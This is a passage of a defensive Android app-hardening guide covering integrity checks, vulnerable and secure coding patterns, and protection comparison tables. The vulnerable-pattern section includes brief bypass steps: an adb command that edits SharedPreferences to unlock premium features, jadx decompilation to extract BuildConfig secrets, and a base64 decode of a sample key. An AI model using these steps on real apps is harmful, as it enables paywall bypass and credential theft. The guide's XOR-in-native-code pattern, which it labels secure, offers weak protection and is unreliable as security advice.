                if (!verifyDexIntegrity(context)) {
                    handleTampering("DEX integrity check failed")
                }
                
                // Sleep for 60 seconds
                Thread.sleep(60000)
            }
        }.start()
    }
    
    private fun handleTampering(reason: String) {
        // App has been tampered with!
        // Take action: log, alert server, exit, etc.
        android.util.Log.e("Security", "Tampering detected: $reason")
        android.os.Process.killProcess(android.os.Process.myPid())
    }
}

// Usage
class SecureApplication : Application() {
    override fun onCreate() {
        super.onCreate()
        
        // Verify integrity immediately
        if (!IntegrityChecker.verifyAppSignature(this)) {
            // App has been repackaged!
            handleRepackagedApp()
            return
        }
        
        // Start continuous monitoring
        IntegrityChecker.startContinuousMonitoring(this)
        
        // Continue normal initialization
        initializeApp()
    }
    
    private fun handleRepackagedApp() {
        // Option 1: Exit immediately
        android.os.Process.killProcess(android.os.Process.myPid())
        
        // Option 2: Show warning
        // Toast.makeText(this, "Security violation detected", Toast.LENGTH_LONG).show()
    }
}
```

**Benefits:**
- ✅ Detects repackaging (signature mismatch)
- ✅ Detects code tampering (checksum verification)
- ✅ Continuous monitoring (periodic checks)
- ✅ Multiple verification methods
- ✅ Immediate response to tampering

---

## Common Vulnerable Patterns

### Pattern 1: Premium Features with Local Validation

```kotlin
// VULNERABLE PATTERN
class PremiumFeatures {
    fun isPremium(): Boolean {
        // ❌ Local check only - easily bypassed
        return sharedPrefs.getBoolean("is_premium", false)
    }
    
    fun unlockFeature() {
        if (isPremium()) {
            // Grant access
        }
    }
}
```

**Bypass:**
```bash
# Modify SharedPreferences
adb shell "echo '<boolean name=\"is_premium\" value=\"true\" />' >> /data/data/com.app/shared_prefs/prefs.xml"
```

### Pattern 2: API Keys in BuildConfig

```kotlin
// VULNERABLE PATTERN
object ApiConfig {
    // ❌ BuildConfig values visible in decompiled code
    val API_KEY = BuildConfig.STRIPE_API_KEY
    val SECRET = BuildConfig.AWS_SECRET
}
```

**Extraction:**
```bash
# Decompile and find BuildConfig class
jadx app.apk
cat sources/com/company/app/BuildConfig.java
# All "secrets" exposed!
```

### Pattern 3: Weak String Encoding

```kotlin
// VULNERABLE PATTERN - Base64 is NOT encryption!
object Config {
    private const val ENCODED_KEY = "c2stbGl2ZV94eXoxMjM="  // Base64
    
    fun getApiKey(): String {
        // ❌ Base64 decode is trivial
        return String(Base64.decode(ENCODED_KEY, Base64.DEFAULT))
    }
}
```

**Attack:**
```bash
$ echo "c2stbGl2ZV94eXoxMjM=" | base64 -d
sk-live-xyz123  # Instantly decoded
```

---

## Secure Implementation Patterns

### Pattern 1: Server-Side Validation + Local Obfuscation

```kotlin
// SECURE PATTERN
class PremiumManager {
    
    /**
     * Always validate with server, cache for offline use
     */
    suspend fun isPremiumUser(userId: String): Boolean {
        // Server validation (source of truth)
        val serverResult = apiClient.checkPremiumStatus(userId)
        
        // Cache encrypted result
        cacheEncryptedPremiumStatus(serverResult)
        
        return serverResult.isPremium
    }
    
    /**
     * Offline check uses encrypted cache
     */
    fun isPremiumUserOffline(): Boolean {
        val encrypted = securePrefs.getString("premium_cache", null) ?: return false
        val decrypted = SecureKeyManager.decrypt(encrypted)
        
        // Verify timestamp (cache expires after 24h)
        val cache = Json.decodeFromString<PremiumCache>(decrypted)
        return !cache.isExpired() && cache.isPremium
    }
}
```

### Pattern 2: Native Code for Sensitive Logic

```c
// native-lib.cpp - SECURE
#include <jni.h>
#include <string>

// Store sensitive data in native code (harder to extract)
static const char* encrypted_key = "\x8A\x3F\x2B...";  // XOR encrypted

extern "C" JNIEXPORT jstring JNICALL
Java_com_company_app_NativeSecure_getDecryptedKey(
        JNIEnv* env,
        jobject /* this */) {
    
    // Decrypt key at runtime
    std::string decrypted = xorDecrypt(encrypted_key);
    
    // Return to Java (use immediately, don't store)
    return env->NewStringUTF(decrypted.c_str());
}
```

### Pattern 3: Time-Based Key Rotation

```kotlin
// SECURE PATTERN - Keys rotate periodically
object ApiKeyManager {
    
    /**
     * Fetch current API key from server
     * Keys rotate every 24 hours
     */
    suspend fun getCurrentApiKey(): String {
        // Check if cached key is still valid
        val cached = getCachedKey()
        if (cached != null && !cached.isExpired()) {
            return cached.key
        }
        
        // Fetch new key from server
        val newKey = apiClient.fetchRotatingKey()
        cacheKey(newKey)
        
        return newKey.key
    }
    
    private data class CachedKey(
        val key: String,
        val expiresAt: Long
    ) {
        fun isExpired() = System.currentTimeMillis() > expiresAt
    }
}
```

---

## Comparison Tables

### Security Levels Comparison

| Aspect | Vulnerable | Basic Protection | Enhanced Protection | Maximum Protection |
|--------|-----------|------------------|---------------------|-------------------|
| **Obfuscation** | None | ProGuard (default) | ProGuard (custom rules) | DexGuard/Commercial |
| **Anti-Debug** | None | Basic check | Multi-method | Native + runtime |
| **Root Detection** | None | File check only | Multi-method | SafetyNet + custom |
| **Integrity Check** | None | None | Signature verification | Continuous monitoring |
| **Key Storage** | Hardcoded | Obfuscated | KeyStore/Keychain | Hardware-backed |
| **Certificate Pinning** | None | None | OkHttp pinner | Custom validation |
| **Time to Reverse** | 5 min | 1 hour | 1 day | 1+ weeks |
| **Cost** | $0 | $0 | $0 | $3,000-20,000/year |
| **Suitable For** | Learning | Low-risk apps | Most apps | Banking, Health, Premium |

### Attack Resistance Comparison

| Attack Type | No Protection | ProGuard Only | Enhanced | Maximum |
|-------------|--------------|---------------|----------|---------|
| Static Analysis | ❌ Trivial | ⚠️ Easy | ✅ Hard | ✅ Very Hard |
| Decompilation | ❌ Perfect reconstruction | ⚠️ Obfuscated names | ✅ Complex code | ✅ Virtualized |
| String Extraction | ❌ All secrets visible | ❌ Most visible | ✅ Encrypted | ✅ Runtime decryption |
| Debugging | ❌ Full access | ❌ Works | ⚠️ Detected | ✅ Blocked |
| Hooking (Frida) | ❌ Complete control | ❌ Works | ⚠️ Detected | ✅ Multi-layer detection |
| Repackaging | ❌ Undetected | ❌ Works | ⚠️ Detected | ✅ Immediate detection |
| Root/Jailbreak | ❌ Full exploitation | ❌ Works | ⚠️ Warning shown | ✅ App exits |

**Legend:**  
❌ No protection  
⚠️ Partial protection  
✅ Good protection

---

## Conclusion

Binary protection is achieved through layered defenses. No single technique is sufficient, but combining multiple strategies significantly increases the cost and complexity of attacks.

**Implementation Priority:**
1. **Critical:** Remove all hardcoded secrets, enable ProGuard, disable debugging
2. **High:** Implement certificate pinning, basic root detection, signature verification
3. **Medium:** Add anti-debugging, comprehensive root detection, integrity monitoring
4. **Advanced:** Commercial obfuscation, RASP, hardware-backed security

Choose protection level based on your app's risk profile and budget. A free utility app needs basic protection; financial apps require maximum hardening.
